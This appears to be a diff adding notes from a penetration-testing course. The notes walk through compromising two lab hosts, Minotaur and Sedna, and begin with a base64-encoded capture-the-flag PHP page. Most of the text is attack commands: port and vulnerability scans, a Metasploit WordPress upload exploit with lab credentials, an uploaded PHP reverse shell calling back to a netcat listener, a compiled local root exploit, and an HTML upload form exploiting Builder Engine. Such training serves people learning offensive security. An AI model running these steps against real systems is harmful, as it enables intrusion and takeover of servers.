+PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCBtYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+CjxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWchIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKLy8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQovLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg==
+-------------------------------------------------------------------
+<?php
+defined ('VIAINDEX') or die('Ooooh! So close..');
+?>
+<h1>Flag</h1>
+<p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
+<img src="trollface.png" />
+<?php
+// Ok, ok. Here's your flag!
+//
+// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+//
+// Well done, you're doing great so far!
+// Next step. SHELL!
+//
+//
+// Oh. That flag above? You're gonna need it...
+?>
+ 
+######################
+# Attacking Minotaur #
+######################
+
+Step 1: Portscan/Bannergrab the target host
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.117
+-----------------------------------------------------------------------
+
+
+
+Step 2: Vulnerability scan the web server
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd ~/toolz/Nikto2/program
+
+perl nikto.pl -h 172.31.2.117
+-----------------------------------------------------------------------
+
+
+
+Step 3: Directory brute-force the webserver
+---------------------------Type This-----------------------------------
+cd ~/toolz
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.117 wordlists/big.txt
+-----------------------------------------------------------------------
+
+### dirb output ###
+==> DIRECTORY: http://172.31.2.117/bull/
+-----------------------------------------------------------------------
+
+
+Step 4: Run wordpress vulnerability scanner
+---------------------------Type This-----------------------------------
+sudo apt-get install -y libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev
+
+cd ~/toolz
+
+rm -rf wpsca*
+
+git clone https://github.com/wpscanteam/wpscan.git
+
+cd wpscan
+
+sudo gem install bundler && bundle install --without test development
+
+rbenv install 2.5.0-dev
+
+ruby wpscan.rb -u http://172.31.2.117/bull/ --enumerate u
+-----------------------------------------------------------------------
+
+
+
+
+Step 5: Attack vulnerable Wordpress plugin with Metasploit
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use exploit/unix/webapp/wp_slideshowgallery_upload
+
+set RHOST 172.31.2.117
+
+set RPORT 80
+
+set TARGETURI /bull
+
+set WP_USER bully
+
+set WP_PASSWORD Bighornedbulls
+
+exploit
+-----------------------------------------------------------------------
+
+Damn...that didn't work...Can't reverse shell from inside the network to a host in the VPN network range.
+This is a lab limitation that I implemented to stop students from compromising hosts in the lab network
+and then from the lab network attacking other students.
+
+
+---------------------------Type This-----------------------------------
+wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+
+tar -zxvf php-reverse-shell-1.0.tar.gz
+
+cd ~/toolz/php-reverse-shell-1.0/
+
+nano php-reverse-shell.php
+-----------------------------------------------------------------------
+	***** change the $ip and $port variables to a host that you have already compromised in the network
+	***** for this example I chose 172.31.2.64 and kept port 1234
+
+
+---------------------------Type This-----------------------------------
+chmod 777 php-reverse-shell.php
+cp php-reverse-shell.php ..
+-----------------------------------------------------------------------
+
+
+
+----------- Paste this into a new file called wp_gallery_slideshow_146_suv.py -----------
+https://www.exploit-db.com/raw/34681/
+
+python wp_gallery_slideshow_146_suv.py -t http://172.31.2.117/bull/ -u bully -p Bighornedbulls -f php-reverse-shell.php
+
+-----------------------------------------------------------------------
+
+
+
+Set up netcat listener on previously compromised host
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+	webmin1980
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+cd /tmp
+
+./boom2
+
+nc -lvp 1234
+-----------------------------------------------------------------------
+
+
+
+
+---------------------Type This in your browser ------------------------
+http://172.31.2.117/bull//wp-content/uploads/slideshow-gallery/php-reverse-shell.php 
+-----------------------------------------------------------------------
+
+
+Now check your listener to see if you got the connection
+---------------------------Type This-----------------------------------
+id
+
+/sbin/ifconfig
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+---------------------------Type This-----------------------------------
+cd /tmp
+cat >> exploit2.c << out
+----------------------------------------------------------------------- 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+
+**************hit enter a few times *****************
+
+---------------------------Type This-----------------------------------
+out
+
+
+gcc -o boom2 exploit2.c
+ 
+./boom2
+
+id
+-----------------------------------------------------------------------
+
+......YEAH - do the happy dance!!!!
+
+
+
+
+ 
+ ##################
+# Attacking Sedna #
+###################
+
+Attack steps:
+-------------
+ 
+ 
+ 
+Step 1: Ping sweep the target network
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+
+
+
+
+
+
+Step 2: Port scan/Bannergrab the target host
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.86
+-----------------------------------------------------------------------
+
+
+PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         (protocol 2.0)
+53/tcp   open     domain      ISC BIND 9.9.5-3-Ubuntu
+80/tcp   open     http        Apache httpd 2.4.7 ((Ubuntu))
+110/tcp  open     pop3        Dovecot pop3d
+111/tcp  open     rpcbind     2-4 (RPC #100000)
+139/tcp  open     netbios-ssn Samba smbd 3.X (workgroup: SEDNA)
+143/tcp  open     imap        Dovecot imapd
+445/tcp  open     netbios-ssn Samba smbd 3.X (workgroup: SEDNA)
+514/tcp  filtered shell
+993/tcp  open     ssl/imap    Dovecot imapd
+995/tcp  open     ssl/pop3    Dovecot pop3d
+8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.40%I=7%D=1/26%Time=5A6B4540%P=x86_64-pc-linux-gnu%r(NULL
+SF:,29,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n");
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 246.11 seconds
+
+
+
+
+
+
+
+
+
+Step 3: Vulnerability scan the webserver ports
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.86
+
+perl nikto.pl -h 172.31.2.86:8080
+-----------------------------------------------------------------------
+
+
+
+
+
+Step 4: Perform directory bruteforce against the target host
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.86 -v
+-----------------------------------------------------------------------
+
+
+
+                  or with dirbuster (dirb)
+
+
+
+
+---------------------------Type This-----------------------------------
+cd ~/toolz
+
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.86 wordlists/big.txt
+-----------------------------------------------------------------------
+
+### dirb output ###
+==> DIRECTORY: http://172.31.2.86/blocks/
+==> DIRECTORY: http://172.31.2.86/files/
+==> DIRECTORY: http://172.31.2.86/modules/
+==> DIRECTORY: http://172.31.2.86/system/
+==> DIRECTORY: http://172.31.2.86/themes/
+
++ http://172.31.2.86/robots.txt (CODE:200|SIZE:36)
++ http://172.31.2.86/server-status (CODE:403|SIZE:291)
+### dirb output ###
+
+
+
+
+
+Browsed each of the directories and found that inside of the /themes folder contained the vulnerable application Builder Engine 3.5.0
+
+An exploit for this application can be found at:
+https://www.exploit-db.com/exploits/40390/
+
+
+
+
+
+-------------------save this a "BuilderEngine.html"-------------------
+<html>
+<body>
+<form method="post" action="http://172.31.2.86/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" 
+
+enctype="multipart/form-data">
+    <input type="file" name="files[]" />
+    <input type="submit" value="send" />
+</form>
+</body>
+</html>
+-----------------------------------------------------------------------
+
+
+Download this webshell (http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) to your local machine.
+
+Change the IP address in the source code of the webshell to another server in the lab network that you have root access to.
+
+On the other server run:
+nc -lvp 1234
+
+Then upload the pentestmonkey reverseshell to .86
+ 
+============================================ Attacking another server because I need a reverse shell =========================================
+
+##################
+# Day 1 Homework #
+##################
+Send Ivana an email ivana{a-t}strategicsec{d-o-t}.com with a word document that contains screenshots of everything that we have covered so far. Make the subject of the email "First Name - Last Name - CyberWar Day 1" (ex: Joseph - McCray - CyberWar Day 1).
+ 
+Also be sure to name the attached file "FirstName.LastName.CyberwarDay1.docx" (Joseph.McCray.CyberWarDay1.docx).
+ 
+NOTE: This is what is required in order to receive your certificate of completion and CPEs.
